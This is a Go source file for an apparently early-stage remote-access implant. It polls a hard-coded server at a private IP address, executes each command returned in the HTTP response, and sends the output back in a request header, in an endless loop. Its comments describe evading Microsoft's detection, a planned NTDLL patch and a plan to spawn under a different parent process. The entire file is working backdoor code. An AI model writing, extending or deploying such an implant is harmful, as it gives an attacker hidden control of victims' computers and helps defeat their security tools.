package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

var charset = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		// randomly select 1 character from given charset
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func main() {
	// to do
	// generate random uuid of numbers/letters [done]
	// add a user agent with http.requests
	// execute out from http request [all done]
	// Patch NTDLL
	uuid := randStr(20)
	fmt.Printf("%s \n", uuid)
	// Construct the client for requests, we define nothing right now but in the future can add functionality
	client := http.Client{}
	// The request itself, a simple GET to the py server hosting index.html with whoami written
	// This will need to be changed to a UUID that's generated at each run time
	req, err := http.NewRequest("GET", "http://192.168.1.166:8000", nil)
	req.Header.Add("APPSESSIONID", uuid)
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	//Convert the body to type string
	sb := string(body)
	fmt.Printf(sb)

	// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
	sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this

	cmd := exec.Command(sb1)

	result, _ := cmd.Output()
	time.Sleep(10)
	req, err = http.NewRequest("GET", "http://192.168.1.166:8000", nil)
	req.Header.Add("APPSESSIONID", uuid)
	req.Header.Add("REZ", string(result))
	resp, err = client.Do(req)

	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating
	// Add two features: 1) Spawn a new parent process whos context we execute ocmmands under 2) add a profile.json section with which the destination, delay, HTTP method, and user agent can all be customized
	for true {

		req, err = http.NewRequest("GET", "http://192.168.1.166:8000", nil)
		req.Header.Add("APPSESSIONID", uuid)
		resp, err = client.Do(req)
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalln(err)
		}

		//Convert the body to type string
		sb := string(body)
		fmt.Printf(sb)

		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this

		cmd := exec.Command(sb1)

		result, _ := cmd.Output()

		time.Sleep(10)
		req, err = http.NewRequest("GET", "http://192.168.1.166:8000", nil)
		req.Header.Add("APPSESSIONID", uuid)
		req.Header.Add("REZ", string(result))
		resp, err = client.Do(req)
	}

}
